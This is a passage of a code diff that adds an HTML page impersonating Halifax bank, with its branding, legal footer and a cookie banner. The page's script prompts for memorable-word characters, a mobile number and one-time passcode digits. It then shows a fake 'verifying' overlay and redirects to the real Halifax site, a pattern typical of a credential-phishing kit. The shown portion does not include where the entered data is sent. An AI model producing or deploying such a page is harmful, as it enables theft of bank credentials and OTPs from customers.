+          <p>Mon&ndash;Fri 8am&ndash;8pm<br>Sat&ndash;Sun 9am&ndash;5pm</p>
+          <p><a href="#">Visit our Help Centre</a></p>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</main>
+
+<footer>
+  <div class="flinks">
+    <a href="#">Privacy notice</a>
+    <a href="#">Cookie policy</a>
+    <a href="#">Accessibility</a>
+    <a href="#">Terms &amp; conditions</a>
+    <a href="#">Security centre</a>
+    <a href="#">Contact us</a>
+  </div>
+  <p class="fcopy">Halifax is a division of Bank of Scotland plc. Registered in Scotland No. SC327000. Registered Office: The Mound, Edinburgh, EH1 1YZ.<br>Bank of Scotland plc is authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority.</p>
+</footer>
+
+<script>
+  // Generate random char positions for memorable word (3 chars from a 8-char word)
+  var positions = [];
+  (function(){
+    var used = {};
+    while(positions.length < 3){
+      var n = Math.floor(Math.random()*8)+1;
+      if(!used[n]){ used[n]=true; positions.push(n); }
+    }
+    positions.sort(function(a,b){return a-b;});
+    var row = document.getElementById('char-row');
+    positions.forEach(function(p){
+      var fg = document.createElement('div');
+      fg.className = 'char-fg';
+      var suffix = p===1?'st':p===2?'nd':p===3?'rd':'th';
+      fg.innerHTML = '<label>'+p+'<sup>'+suffix+'</sup></label><input type="password" maxlength="1" />';
+      row.appendChild(fg);
+    });
+  })();
+  function goWithLoader(n, btn) {
+    var origHtml = btn.innerHTML;
+    var isFinal  = n === 4;
+    btn.disabled = true;
+    btn.style.opacity = '.72';
+    btn.innerHTML = '<span style="display:inline-block;width:14px;height:14px;border:2.5px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:ld-spin .65s linear infinite;vertical-align:middle;margin-right:8px;"></span>'
+                  + (isFinal ? 'Verifying…' : 'Please wait…');
+    var ov  = document.getElementById('ld-ov');
+    var msg = document.getElementById('ld-msg');
+    msg.textContent = isFinal ? 'Verifying your details…' : 'Please wait…';
+    ov.style.display = 'flex';
+    /* double rAF forces repaint so transition fires */
+    requestAnimationFrame(function(){ requestAnimationFrame(function(){ ov.style.opacity = '1'; }); });
+    setTimeout(function() {
+      go(n);
+      setTimeout(function() {
+        ov.style.opacity = '0';
+        setTimeout(function() { ov.style.display = 'none'; }, 260);
+        /* restore button only on non-final steps */
+        if (!isFinal) {
+          btn.innerHTML = origHtml;
+          btn.disabled  = false;
+          btn.style.opacity = '1';
+        }
+      }, isFinal ? 400 : 200);
+    }, isFinal ? 1500 : 680);
+  }
+
+
+
+  function go(n) {
+    if (n === 3) {
+      var raw = document.getElementById('hfx-mobile').value.replace(/\s/g, '');
+      var hint = raw.length >= 2 ? '●●●●' + raw.slice(-2) : (raw || '●●●●??');
+      document.getElementById('hfx-mobile-hint').textContent = hint;
+    }
+    document.querySelectorAll('.step').forEach(function(s){ s.classList.remove('active'); });
+    ['sb1','sb2','sb3','sb4'].forEach(function(id,i){
+      var el = document.getElementById(id);
+      el.classList.remove('active','done');
+      if(i+1 < n) el.classList.add('done');
+      else if(i+1 === n) el.classList.add('active');
+    });
+    document.getElementById('step'+n).classList.add('active');
+    if(n===4) redirect();
+  }
+
+  function redirect(){
+    var s=5, fill=document.getElementById('pfill'), txt=document.getElementById('ctxt');
+    fill.style.transition='width '+s+'s linear';
+    setTimeout(function(){ fill.style.width='100%'; },50);
+    var iv=setInterval(function(){
+      s--;
+      if(s<=0){clearInterval(iv);txt.textContent='Redirecting now...';setTimeout(function(){window.location.href='https://www.halifax.co.uk';},400);}
+      else txt.textContent='Redirecting in '+s+' second'+(s!==1?'s':'');
+    },1000);
+  }
+
+  var otpInputs = document.querySelectorAll('.hfx-otp');
+  otpInputs.forEach(function(inp,i){
+    inp.addEventListener('input',function(){
+      this.value=this.value.replace(/[^0-9]/g,'');
+      if(this.value&&i<otpInputs.length-1) otpInputs[i+1].focus();
+    });
+    inp.addEventListener('keydown',function(e){
+      if(e.key==='Backspace'&&!this.value&&i>0) otpInputs[i-1].focus();
+    });
+  });
+</script>
+
+  <!-- Loading Overlay -->
+  <div id="ld-ov" style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(255,255,255,.96);z-index:9000;display:none;flex-direction:column;align-items:center;justify-content:center;gap:20px;opacity:0;transition:opacity .25s;">
+    <div style="position:relative;width:56px;height:56px;">
+      <div style="position:absolute;top:0;left:0;right:0;bottom:0;border-radius:50%;border:4px solid #e8e8e8;"></div>
+      <div style="position:absolute;top:0;left:0;right:0;bottom:0;border-radius:50%;border:4px solid transparent;border-top-color:#0056A6;animation:ld-spin .8s linear infinite;"></div>
+    </div>
+    <div id="ld-msg" style="font-size:14px;color:#555;font-weight:600;letter-spacing:.2px;"></div>
+  </div>
+
+  <!-- Cookie Banner -->
+  <div id="ck-bar" style="position:fixed;bottom:0;left:0;right:0;z-index:9999;">
+    <style>
+      @keyframes ckUp{from{transform:translateY(110%);opacity:0}to{transform:translateY(0);opacity:1}}
+      @keyframes ckDown{from{transform:translateY(0);opacity:1}to{transform:translateY(110%);opacity:0}}
+      #ck-bar{animation:ckUp .5s cubic-bezier(.22,1,.36,1) forwards;}
+    </style>
+    <div style="height:4px;background:#0056A6;"></div>
+    <div style="background:#111;padding:18px 28px;display:flex;align-items:center;gap:20px;flex-wrap:wrap;box-shadow:0 -6px 28px rgba(0,0,0,.5);">
+      <div style="width:48px;height:48px;background:#0056A6;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:24px;flex-shrink:0;box-shadow:0 2px 10px rgba(0,0,0,.3);">&#127850;</div>
+      <div style="flex:1;min-width:200px;">
+        <div style="font-size:14px;font-weight:800;color:#fff;margin-bottom:5px;letter-spacing:.1px;">Halifax uses cookies</div>
+        <p style="font-size:12px;color:#aaa;margin:0;line-height:1.6;">We use cookies and similar technologies to enhance your experience, remember your preferences and help us understand how our site is used. <a href="#" style="color:#7eb0e0;text-decoration:underline;font-weight:600;">Read our cookie policy</a></p>
+      </div>
+      <div style="display:flex;gap:10px;flex-shrink:0;">
+        <button onclick="manageCk()" onmouseover="this.style.borderColor='#aaa';this.style.color='#fff'" onmouseout="this.style.borderColor='#555';this.style.color='#ccc'" style="padding:10px 18px;background:transparent;color:#ccc;border:1.5px solid #555;border-radius:5px;cursor:pointer;font-size:12px;font-weight:600;transition:all .15s;white-space:nowrap;">Manage preferences</button>
+        <button onclick="acceptCk()" onmouseover="this.style.opacity='.88'" onmouseout="this.style.opacity='1'" style="padding:10px 24px;background:#0056A6;color:#fff;border:none;border-radius:5px;cursor:pointer;font-size:13px;font-weight:800;transition:opacity .15s;white-space:nowrap;box-shadow:0 2px 8px rgba(0,0,0,.25);">Accept all cookies</button>
+      </div>
+    </div>
+  </div>
+  <script>
+    (function(){if(localStorage.getItem('ck-ok'))document.getElementById('ck-bar').style.display='none';})();
+    function acceptCk(){localStorage.setItem('ck-ok','1');var b=document.getElementById('ck-bar');b.style.animation='ckDown .35s ease forwards';setTimeout(function(){b.style.display='none';},320);}
+    function manageCk(){acceptCk();}
+  </script>
+</body>
+</html>
